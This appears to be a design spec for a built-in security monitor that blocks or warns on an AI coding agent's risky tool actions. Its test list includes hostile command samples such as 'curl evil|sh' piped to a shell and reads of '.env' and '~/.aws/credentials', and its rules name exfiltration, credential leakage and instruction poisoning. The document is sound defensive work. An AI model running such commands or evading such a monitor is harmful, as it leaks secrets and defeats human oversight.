# Feature — Security monitor (read-only risk gate on tool actions)

## Context

The agent already gates every mutating/executing tool through `checkPermission`
(`src/permissions/policy.ts:18`), which folds the tool `kind` + approval mode +
the command classifier into `allow | ask | deny`. There is a `PreToolUse`
lifecycle hook that fires **after** the policy allows/approves a tool but
**before** it executes (`src/agent/agentLoop.ts:290-314`), and a hook
`decision: "deny"` is **additive** — it can only block a tool the policy already
let through; it can never resurrect a policy-denied tool (those never reach the
hook — see `src/hooks/types.ts:2-4`). What is missing is a *built-in, default*
risk evaluator: today a deny only happens if the user wires an external shell
hook into `config.hooks.events.PreToolUse`.

This feature adds a **rule-based security monitor**: a deterministic, in-process
PreToolUse evaluator that scores each tool action against block/allow risk rules
(adapted from `deepcoder-system-prompts/agent-prompt-security-monitor-*.md`) and
returns a `HookOutcome` — denying HARD-BLOCK actions and warning on SOFT-BLOCK
ones. An **optional** model-backed risk subagent handles ambiguous cases
(read-only, advisory). The monitor is purely **additive** (see ## Safety).

## Model

- **Risk rules** mirror the adapted prompts. HARD BLOCK = security boundary
  (data exfiltration across the trust boundary, credential leakage, instruction
  poisoning) — denies regardless of mode. SOFT BLOCK = destructive/irreversible
  (git force-push / history rewrite, `curl|bash`, prod/cloud mass-delete,
  permission grants, self-modification) — warns (advisory) by default; only
  HARD blocks deny. (Source: `agent-prompt-...-first-part.md:2-9`,
  `...-second-part.md:2-15`.)
- A monitor evaluation yields `{ decision: "deny" | "none"; reason?; warnings? }`
  matching `HookOutcome` (`src/hooks/types.ts:48-53`) plus an extra `warnings`
  list surfaced via `onNotice` (never blocks).
- Input is exactly what the PreToolUse path already carries: the tool name,
  `invocation.command` (execute tools), and `invocation.affectedPaths`
  (`src/tools/types.ts:103-110`) — same fields `repl.ts:195` passes today.
- **Composite/encoded commands**: a chained command (`a && b`, pipes) blocks the
  whole action if ANY segment is HARD BLOCK; unverifiable encoded payloads warn.

## Design

A new in-process module evaluated from the existing `onPreToolUse` callback —
no change to the hook contract or the agent loop.

### `src/security/monitor.ts` (core, deterministic)
```ts
export interface SecurityVerdict { decision: "deny" | "none"; reason?: string; warnings: string[]; }
export interface MonitorConfig { enabled: boolean; mode: "block" | "warn"; } // default { enabled:false, mode:"block" }
export function evaluateAction(input: PreToolUseInput, cfg: MonitorConfig): SecurityVerdict;
```
- Pure function over `PreToolUseInput`. HARD-BLOCK rule match → `decision:"deny"`
  with a redaction-safe reason. SOFT-BLOCK match → `decision:"none"`, push a
  warning string. No match → `{ decision:"none", warnings:[] }` (default ALLOW,
  per `...-first-part.md:2`).
- Reuse existing classifiers — do NOT reimplement command parsing: call
  `classifyCommand` (`src/permissions/commandClassifier.ts`) for the command tier
  and `isSensitivePath` (`src/workspace/sensitive.js`, surfaced via
  `src/tools/pathGuards.ts:4`) for credential/sensitive-path detection on
  `affectedPaths`. The monitor only ADDS rules the classifier doesn't encode
  (exfil destinations, instruction-poisoning, sub-agent prompt inspection).
- Encoded/obfuscated → if undecodable, HARD BLOCK (`...-first-part.md:8`).

### Wiring — `src/cli/repl.ts:187 preToolUseHook`
Compose the monitor *before* the existing config-hook run, returning the FIRST
deny (monitor or config hook). Both produce `HookOutcome`; warnings route to
`onNotice`. When `monitor.enabled === false` (default), `preToolUseHook` behaves
byte-identically to today — the monitor branch is skipped entirely.
```ts
const v = monitor.enabled ? evaluateAction(toolInput, monitor) : { decision:"none", warnings:[] };
for (const w of v.warnings) ctx.onNotice?.(`security: ${w}`); // advisory
if (v.decision === "deny") return { decision:"deny", reason:v.reason };
return runPreToolUseHooks(list, toolInput, hookCtx); // unchanged
```
The agent loop already turns a `deny` into a non-running tool result and never
aborts the run (`agentLoop.ts:303-313`). The monitor adds NO new code path there.

### Optional LLM risk-assessor subagent — `src/subagents/profiles.ts`
Add a **read-only, advisory** `riskAssessor` profile (only `READ_ONLY_TOOLS`,
`agentLoop.ts` never lets a subagent mutate) for AMBIGUOUS soft-block cases the
rules can't classify. Its `SubagentResult` (`src/subagents/types.ts:33-41`) is
NON-authoritative: the parent may surface findings as warnings but the deterministic
rules remain the sole source of a `deny`. The subagent NEVER returns a deny that
the rules didn't already produce.

### Config
Add `security?: MonitorConfig` to the config shape (default disabled), parsed
alongside `hooks`. Disabled = no behavior change anywhere.

## Files to change
- **New:** `src/security/monitor.ts`, `src/security/rules.ts` (HARD/SOFT rule
  tables + matchers), `test/security-monitor.test.ts`.
- **Edit:** `src/cli/repl.ts` (compose monitor into `preToolUseHook`, ~line 187),
  `src/config/config.ts` (add `security` field + default), `src/subagents/profiles.ts`
  (+ `riskAssessor` profile, register in `PROFILES`).
- **Do NOT touch:** `src/permissions/policy.ts`, `src/hooks/runner.ts`,
  `src/hooks/types.ts`, `src/agent/agentLoop.ts` — the monitor rides the existing
  contract; changing these would risk the additive invariant.

## Tests (RED first)
`test/security-monitor.test.ts` — pure unit tests of `evaluateAction` (no mocks):
- HARD BLOCK: exfil command (`curl ... | sh` to external host) → `decision:"deny"`.
- HARD BLOCK: read of a sensitive/credential path in `affectedPaths` (`.env`,
  `~/.aws/credentials`) when content crosses the trust boundary → deny.
- SOFT BLOCK: `git push --force origin main` → `decision:"none"` + a warning
  (NOT a deny in default `mode:"block"` — soft only warns).
- Composite: `safe.sh && curl evil|sh` → deny (any segment HARD blocks).
- ALLOW: ordinary `npm test`, local edit → `{decision:"none", warnings:[]}`.
- `enabled:false` → always `{decision:"none", warnings:[]}` (no-op).
- Wiring: with the monitor enabled, a policy-DENIED tool never reaches
  `evaluateAction` (assert it's not called) — proves additive-only.
- The reason string is redaction-safe (no raw secret echoed).

## Verification
1. `npm run typecheck` clean; `npm run test:phase` green WITH the new tests.
2. Monitor disabled (default): existing hook tests + agent-loop tests unchanged
   (byte-identical `preToolUseHook` when `enabled:false`).
3. Manual: enable `security.enabled` in config, ask the agent to `curl|bash` an
   external script → blocked with a clear reason; `git push --force` → warned but
   proceeds (soft).

## Safety
- **ADDITIVE-ONLY INVARIANT (front and center):** the monitor may only ADD denials
  or warnings. It runs in `onPreToolUse`, which fires *after* `checkPermission`
  already allowed/approved the tool (`agentLoop.ts:290-291`), so a monitor deny can
  never resurrect a policy-denied tool. It MUST NOT relax, bypass, or pre-authorize
  anything the permission policy denies/asks. **No permission-bypass
  pre-authorization** (per project memory). The monitor never calls `checkPermission`
  with a weaker mode and never returns `"allow"` — only `"deny"` or `"none"`.
- It COMPLEMENTS the classifier: it reuses `classifyCommand`/`isSensitivePath`
  rather than re-deciding, and only adds rules they don't encode.
- Default DISABLED. When off, every wired path is byte-identical to today.
- The LLM risk-assessor is read-only + advisory: its output is non-authoritative
  (`src/subagents/types.ts:33`) and can never be the sole cause of a deny.
- Fail-safe direction: a monitor evaluation error must NOT block a policy-allowed
  tool incorrectly — on internal error, return `{decision:"none"}` and emit a
  warning (the policy gate is still in force upstream). Undecodable HARD-BLOCK
  payloads are the one exception (block on uncertainty).

## Worker contract notes
- TDD: write `test/security-monitor.test.ts` RED first, then implement. A green
  `--check phase` with ZERO new tests is a vacuous pass — reject it.
- NEVER weaken the gates: do not edit `policy.ts`, `agentLoop.ts`, `runner.ts`, or
  `types.ts`. The monitor must ride the existing `HookOutcome`/`onPreToolUse`
  contract. If you think you need to touch a gate, STOP and escalate.
- Reuse `classifyCommand` and `isSensitivePath` — do NOT invent a parallel command
  parser or path resolver (drift = security holes). See [[feat-file-delete-rename-tools]]
  for the shared-guard precedent.
- The LLM subagent is OPTIONAL and read-only; ship the deterministic core first.
  Overlaps with [[feat-adapt-claude-prompts]] (which adapts these source prompts) —
  coordinate on the rule wording, but the runtime rules live in `src/security/rules.ts`.
